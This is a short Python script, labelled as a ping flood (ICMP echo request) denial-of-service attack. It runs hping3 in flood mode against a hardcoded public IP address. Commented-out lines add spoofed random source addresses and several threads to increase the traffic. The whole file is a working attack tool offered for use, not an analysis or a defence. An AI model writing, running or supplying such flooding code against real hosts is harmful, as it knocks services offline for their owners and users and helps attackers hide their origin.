# ping flood dos attack or ICMP echo request dos attack

import threading
import os

os.system('clear')

ip = "34.125.53.182"

# flood = os.system("/usr/sbin/hping3 -1 --rand-source --flood %s" %(ip))

def icmp_echo():
    flood = os.system("/usr/sbin/hping3 -1 --flood %s" %(ip))

# one thread itself is able to generate lot of traffic
icmp_echo()
# thread1 = threading.Thread(target=icmp_echo)
# thread2 = threading.Thread(target=icmp_echo)
# thread3 = threading.Thread(target=icmp_echo)
# thread4 = threading.Thread(target=icmp_echo)


# thread1.start()
# thread2.start()
# thread3.start()
# thread4.start()

# thread1.join()
# thread2.join()
# thread3.join()
# thread4.join()
